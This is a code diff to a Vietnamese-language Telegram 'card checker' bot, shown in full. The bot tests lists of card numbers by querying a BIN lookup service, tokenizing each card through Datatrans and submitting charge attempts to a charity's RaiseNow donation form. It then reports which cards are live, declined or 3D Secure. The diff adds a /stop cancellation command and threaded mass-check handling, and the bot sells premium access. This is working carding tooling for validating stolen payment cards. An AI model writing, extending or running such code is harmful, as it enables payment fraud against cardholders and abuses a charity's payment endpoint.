@@ -9,6 +9,7 @@ import re
 import time
 import os
 import shutil
+import threading
 from datetime import datetime
 from pytz import timezone
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
@@ -39,6 +40,7 @@ VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')
 
 # --- BIẾN TOÀN CỤC ĐỂ THEO DÕI TÁC VỤ ĐANG CHẠY ---
 ACTIVE_CHECKS = set()
+CANCELLATION_EVENTS = {} # {user_id: threading.Event}
 
 # --- TIN NHẮN THÔNG BÁO ---
 MESSAGES_VI = {
@@ -149,9 +151,12 @@ def update_user_stats(user_id, user_info, counts):
 
 # --- CÁC HÀM CỐT LÕI ---
 
-def make_request_with_retry(session, method, url, max_retries=5, **kwargs):
+def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
     last_exception = None
     for attempt in range(max_retries):
+        if cancellation_event and cancellation_event.is_set():
+            return None, "Operation cancelled by user"
+            
         try:
             response = session.request(method, url, **kwargs)
             return response, None
@@ -176,7 +181,10 @@ def validate_card_format(cc, mes, ano, cvv):
         return False, "CVV phải có 3 hoặc 4 chữ số."
     return True, ""
 
-def check_card(line):
+def check_card(line, cancellation_event=None):
+    if cancellation_event and cancellation_event.is_set():
+        return 'cancelled', line, 'User cancelled', {}
+
     parts = line.strip().split('|')
     cc, mes, ano, cvv = "", "", "", ""
 
@@ -199,7 +207,6 @@ def check_card(line):
     if not is_valid:
         return 'invalid_format', line, error_message, {}
 
-    # *** THAY ĐỔI LOGIC: Kiểm tra năm hết hạn ***
     try:
         year_str = ano.strip()
         if len(year_str) == 2:
@@ -207,13 +214,11 @@ def check_card(line):
         elif len(year_str) == 4:
             full_year = int(year_str)
         else:
-            # Trường hợp không hợp lệ đã được xử lý bởi validate_card_format
             full_year = 0 
 
         if full_year < 2024:
             return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
     except ValueError:
-        # Xử lý nếu `ano` không phải là số, mặc dù đã được validate
         return 'invalid_format', line, "Năm hết hạn không hợp lệ.", {}
 
     if len(ano) == 2: ano = f"20{ano}"
@@ -228,14 +233,13 @@ def check_card(line):
         bin_to_check = cc[:6]
         bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
         bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
-        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10)
+        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
         
         if error:
-            return 'error', line, f"Lỗi kiểm tra BIN: {error}", {}
+            return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi kiểm tra BIN: {error}", {}
         
         if bin_response:
             response_text_lower = bin_response.text.lower()
-            # Kiểm tra cả hai trường hợp "not found"
             if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                 return 'decline', line, 'INVALID_BIN_DECLINE', {}
             
@@ -257,24 +261,29 @@ def check_card(line):
         tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
         tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
         
-        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
-        if error: return 'error', line, f"Lỗi Tokenize: {error}", bin_info
-        if not token_response or token_response.status_code != 200: return 'error', line, f"Lỗi HTTP {getattr(token_response, 'status_code', 'N/A')} khi Tokenize", bin_info
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
+        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
         
         try:
             token_data = token_response.json()
+            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
+                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+
             transaction_id = token_data.get("transactionId")
             if not transaction_id:
                 return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
         except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
             return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
         
         payment_url = "https://api.raisenow.io/payments"
         payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
         payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
         
-        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20)
-        if error: return 'error', line, f"Lỗi Payment: {error}", bin_info
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
 
         response_text = payment_response.text
 
@@ -363,6 +372,8 @@ async def get_help_text(user: User, lang_code: str):
             "   - *Mô tả:* Kiểm tra hàng loạt thẻ từ một tệp `.txt`.\n"
             "   - *Cách dùng:* Gửi tệp `.txt` và điền caption là `/mass` hoặc `/mass<số luồng>`.\n"
             "   - *Ví dụ:* `/mass3` để chạy 3 luồng.\n\n"
+            "🔹 `/stop`\n"
+            "   - *Mô tả:* Dừng tác vụ `/mass` hoặc `/multi` đang chạy của bạn.\n\n"
             f"💳 **Hạn mức của bạn:** `{user_mass_limit}` lines/file.\n"
             f"🌟 **Nâng cấp Premium:** Liên hệ {ADMIN_USERNAME} để check không giới hạn."
         )
@@ -396,6 +407,8 @@ async def get_help_text(user: User, lang_code: str):
             "   - *Description:* Checks a list of cards from a `.txt` file.\n"
             "   - *How to use:* Send a `.txt` file with the command as the caption.\n"
             "   - *Example:* `/mass3` to run with 3 threads.\n\n"
+            "🔹 `/stop`\n"
+            "   - *Description:* Stops your currently running /mass or /multi task.\n\n"
             f"💳 **Your Limit:** `{user_mass_limit}` lines/file.\n"
             f"🌟 **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
         )
@@ -405,7 +418,8 @@ async def get_help_text(user: User, lang_code: str):
         "**Bảng Lệnh Quản Trị Viên** 👑\n"
         "Toàn quyền quản lý bot với các lệnh sau:\n\n"
         "**Quản lý Bot:**\n"
-        "🔹 `/on`, `/off` - Bật/Tắt bot và thông báo.\n\n"
+        "🔹 `/on`, `/off` - Bật/Tắt bot và thông báo.\n"
+        "🔹 `/stop <user_id>` - Dừng task của user (tùy chọn).\n\n"
         "**Quản lý User & Tin nhắn:**\n"
         "🔹 `/add <user_id>`\n"
         "🔹 `/ban <user_id>`\n"
@@ -616,6 +630,7 @@ async def cs_command(update, context):
         is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
         is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
         is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
+        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'
 
         if is_invalid_bin_decline:
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
@@ -623,6 +638,14 @@ async def cs_command(update, context):
                              f"**🚦 Status: ❌ DECLINED**\n"
                              f"**💬 Response:** `Invalid Card Number (BIN not found)`\n\n"
                              f"**🏦 Gateway:** `BIN Check`\n\n"
+                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                             f"👤 *Checker by: {ADMIN_USERNAME}*")
+        elif is_invalid_cardnumber_decline:
+            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                             f"**💳 Card:** `{original_line}`\n"
+                             f"**🚦 Status: ❌ DECLINED**\n"
+                             f"**💬 Response:** `Invalid Card Number`\n\n"
+                             f"**🏦 Gateway:** `Datatrans Tokenize`\n\n"
                              f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                              f"👤 *Checker by: {ADMIN_USERNAME}*")
         elif is_expired_card_decline:
@@ -707,8 +730,8 @@ async def multi_check_command(update, context):
         await update.message.reply_text(message)
         return
         
-    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
-        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành.", quote=True)
+    if user.id in ACTIVE_CHECKS:
+        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành hoặc dùng /stop.", quote=True)
         return
 
     text_content = update.message.text.split('/multi', 1)[-1].strip()
@@ -734,35 +757,48 @@ async def multi_check_command(update, context):
     status_message = await update.message.reply_text(f"⏳ Đang khởi tạo... Chuẩn bị check `{total_lines}` thẻ.")
     start_time = time.time()
     
+    cancel_event = threading.Event()
     try:
-        if user.id != ADMIN_ID:
-            ACTIVE_CHECKS.add(user.id)
+        ACTIVE_CHECKS.add(user.id)
+        CANCELLATION_EVENTS[user.id] = cancel_event
 
-        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
+        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0}
         results = {k: [] for k in counts.keys()}
         processed_count = 0
         last_update_time = time.time()
         num_threads = min(10, total_lines) 
 
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
-            future_to_line = {executor.submit(check_card, line): line for line in lines}
+            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
             for future in as_completed(future_to_line):
+                if cancel_event.is_set():
+                    counts['cancelled'] += 1
+                    continue # Không xử lý các future còn lại
+
                 processed_count += 1
                 try:
                     status, original_line, full_response, bin_info = future.result()
                     
                     counts[status] = counts.get(status, 0) + 1
                     
-                    status_icons = {'success': '✅', 'decline': '❌', 'custom': '🔒', 'invalid_format': '📋', 'error': '❗️', 'unknown': '❔'}
+                    status_icons = {'success': '✅', 'decline': '❌', 'custom': '🔒', 'invalid_format': '📋', 'error': '❗️', 'unknown': '❔', 'cancelled': '🛑'}
                     
-                    if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
-                        result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
-                    elif status == 'decline' and full_response == 'INVALID_BIN_DECLINE':
-                        result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
-                    elif status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE':
-                        result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
+                    result_line = ""
+                    if status == 'decline':
+                        if full_response == 'VIETNAM_BIN_DECLINE':
+                            result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
+                        elif full_response == 'INVALID_BIN_DECLINE':
+                            result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
+                        elif full_response == 'EXPIRED_CARD_DECLINE':
+                            result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
+                        elif full_response == 'INVALID_CARDNUMBER_DECLINE':
+                            result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
+                        else: # Decline chung
+                             result_line = f"{status_icons['decline']} `{original_line}`"
                     elif status == 'invalid_format':
                         result_line = f"{status_icons[status]} `{original_line}` | Lý do: {str(full_response)[:50]}" 
+                    elif status == 'cancelled':
+                         continue # Bỏ qua không thêm vào kết quả
                     else:
                         bank_str = bin_info.get('bank') or 'N/A'
                         type_str = bin_info.get('type') or 'N/A'
@@ -771,7 +807,9 @@ async def multi_check_command(update, context):
                         bin_str = f"{bank_str} - {type_str} - {brand_str} - {country_str}"
                         result_line = f"{status_icons.get(status, '❔')} `{original_line}` | `{bin_str}`"
 
-                    results[status].append(result_line)
+                    if result_line:
+                        results[status].append(result_line)
+
                 except Exception as e:
                     original_line = future_to_line[future]
                     logger.error(f"Lỗi khi xử lý future cho thẻ {original_line}: {e}", exc_info=True)
@@ -799,6 +837,10 @@ async def multi_check_command(update, context):
         
         duration = time.time() - start_time
         update_user_stats(user.id, user, counts)
+
+        if cancel_event.is_set():
+            await status_message.edit_text(f"🛑 **Tác vụ đã được dừng theo yêu cầu.**\n\nĐã xử lý: {processed_count}/{total_lines} thẻ.")
+            return
 
         final_message = [
             f"**📊 Check Complete!**\n",
@@ -831,8 +873,8 @@ async def multi_check_command(update, context):
         safe_error_message = str(e).replace('`', "'")
         await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!**\n```\n{safe_error_message}\n```")
     finally:
-        if user.id != ADMIN_ID:
-            ACTIVE_CHECKS.discard(user.id)
+        ACTIVE_CHECKS.discard(user.id)
+        CANCELLATION_EVENTS.pop(user.id, None)
 
 async def mass_check_handler(update, context):
     user = update.effective_user
@@ -847,8 +889,9 @@ async def mass_check_handler(update, context):
         await update.message.reply_text(message)
         return
     
-    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
+    if user.id in ACTIVE_CHECKS:
         logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
+        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành hoặc dùng /stop.", quote=True)
         return 
 
     if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
@@ -896,33 +939,48 @@ async def mass_check_handler(update, context):
     status_message = await update.message.reply_text(f"⏳ Khởi tạo... Chuẩn bị check `{total_lines}` thẻ với `{num_threads}` luồng.")
     start_time = time.time()
     
+    cancel_event = threading.Event()
     try:
-        if user.id != ADMIN_ID:
-            ACTIVE_CHECKS.add(user.id)
+        ACTIVE_CHECKS.add(user.id)
+        CANCELLATION_EVENTS[user.id] = cancel_event
 
-        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
+        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0}
         result_lists = {k: [] for k in counts.keys()}
         result_lists['error_debug'] = []
         processed_count = 0
         last_update_time = time.time()
 
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
-            future_to_line = {executor.submit(check_card, line): line for line in lines}
+            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
             for future in as_completed(future_to_line):
+                if cancel_event.is_set():
+                    # Không xử lý các future đã hoàn thành nếu đã hủy
+                    # Đánh dấu các thẻ chưa xử lý là đã hủy
+                    counts['cancelled'] += 1
+                    continue
+
                 processed_count += 1
                 try:
                     status, original_line, full_response, bin_info = future.result()
                     
                     counts[status] = counts.get(status, 0) + 1
                     
-                    if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
-                        line_to_save = f"{original_line} | DECLINED (VN BIN)"
-                    elif status == 'decline' and full_response == 'INVALID_BIN_DECLINE':
-                        line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
-                    elif status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE':
-                        line_to_save = f"{original_line} | DECLINED (Expired)"
+                    line_to_save = ""
+                    if status == 'decline':
+                        if full_response == 'VIETNAM_BIN_DECLINE':
+                            line_to_save = f"{original_line} | DECLINED (VN BIN)"
+                        elif full_response == 'INVALID_BIN_DECLINE':
+                            line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
+                        elif full_response == 'EXPIRED_CARD_DECLINE':
+                            line_to_save = f"{original_line} | DECLINED (Expired)"
+                        elif full_response == 'INVALID_CARDNUMBER_DECLINE':
+                            line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
+                        else: # Decline chung
+                            line_to_save = f"{original_line} | DECLINED"
                     elif status == 'invalid_format':
                         line_to_save = f"{original_line} | Reason: {full_response}"
+                    elif status == 'cancelled':
+                        continue # Bỏ qua
                     else:
                         bank_str = bin_info.get('bank') or 'N/A'
                         type_str = bin_info.get('type') or 'N/A'
@@ -931,7 +989,8 @@ async def mass_check_handler(update, context):
                         bin_str = f"| {bank_str} - {type_str} - {brand_str} - {country_str}"
                         line_to_save = f"{original_line} {bin_str}"
                     
-                    result_lists[status].append(line_to_save)
+                    if line_to_save:
+                        result_lists[status].append(line_to_save)
 
                     if status in ['error', 'unknown']:
                         debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
@@ -964,6 +1023,10 @@ async def mass_check_handler(update, context):
                     last_update_time = time.time()
         
         duration = time.time() - start_time
+
+        if cancel_event.is_set():
+            await status_message.edit_text(f"🛑 **Tác vụ đã được dừng theo yêu cầu.**\n\nĐã xử lý: {processed_count}/{total_lines} thẻ. Kết quả đã xử lý sẽ được gửi đi.")
+        
         final_summary_text = (
             f"**📊 Check Complete!**\n\n"
             f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n\n"
@@ -971,7 +1034,8 @@ async def mass_check_handler(update, context):
             f"❌ **Declined:** `{counts['decline']}`\n"
             f"🔒 **3D Secure:** `{counts['custom']}`\n"
             f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
-            f"❔ **Errors:** `{counts['error']}`\n\n"
+            f"❔ **Errors:** `{counts['error']}`\n"
+            f"🛑 **Cancelled:** `{counts['cancelled']}`\n\n"
             f"**⏱️ Took:** `{duration:.2f}s`"
         )
         
@@ -1007,8 +1071,37 @@ async def mass_check_handler(update, context):
         safe_error_message = str(e).replace('`', "'")
         await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!**\n```\n{safe_error_message}\n```")
     finally:
-        if user.id != ADMIN_ID:
-            ACTIVE_CHECKS.discard(user.id)
+        ACTIVE_CHECKS.discard(user.id)
+        CANCELLATION_EVENTS.pop(user.id, None)
+
+# --- LỆNH DỪNG TASK ---
+async def stop_command(update, context):
+    user = update.effective_user
+    target_user_id = user.id
+
+    # Admin có thể dừng task của người khác
+    if user.id == ADMIN_ID and context.args:
+        try:
+            target_user_id = int(context.args[0])
+        except (ValueError, IndexError):
+            await update.message.reply_text("❌ User ID không hợp lệ. Cú pháp: `/stop <user_id>`")
+            return
+    elif user.id != ADMIN_ID and user.id not in load_users():
+         await update.message.reply_text("Bạn không có quyền dùng lệnh này.")
+         return
+
+    if target_user_id in CANCELLATION_EVENTS:
+        CANCELLATION_EVENTS[target_user_id].set()
+        if target_user_id == user.id:
+            await update.message.reply_text("⏳ Đã gửi yêu cầu dừng. Tác vụ sẽ dừng lại sau khi hoàn thành các thẻ đang check...")
+        else:
+            await update.message.reply_text(f"⏳ Đã gửi yêu cầu dừng tác vụ của người dùng `{target_user_id}`.")
+    else:
+        if target_user_id == user.id:
+            await update.message.reply_text("ℹ️ Bạn không có tác vụ /mass hoặc /multi nào đang chạy.")
+        else:
+            await update.message.reply_text(f"ℹ️ Người dùng `{target_user_id}` không có tác vụ nào đang chạy.")
+
 
 # --- CÁC LỆNH QUẢN LÝ & THÔNG BÁO ---
 async def turn_bot_off(update, context):
@@ -1277,10 +1370,13 @@ def main():
     defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
     application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()
 
+    # Lệnh chung
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("info", info))
     application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("stop", stop_command))
     
+    # Lệnh Admin
     application.add_handler(CommandHandler("add", add_user))
     application.add_handler(CommandHandler("ban", ban_user))
     application.add_handler(CommandHandler("show", show_users))
@@ -1293,11 +1389,13 @@ def main():
     application.add_handler(CommandHandler("send", send_message_command))
     application.add_handler(CommandHandler("sendall", send_all_command))
     
+    # Lệnh Check
     application.add_handler(CommandHandler("cs", cs_command))
     application.add_handler(CommandHandler("bin", bin_command))
     application.add_handler(CommandHandler("multi", multi_check_command))
     application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
     
+    # Xử lý nút bấm
     application.add_handler(CallbackQueryHandler(button_handler))
     
     logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
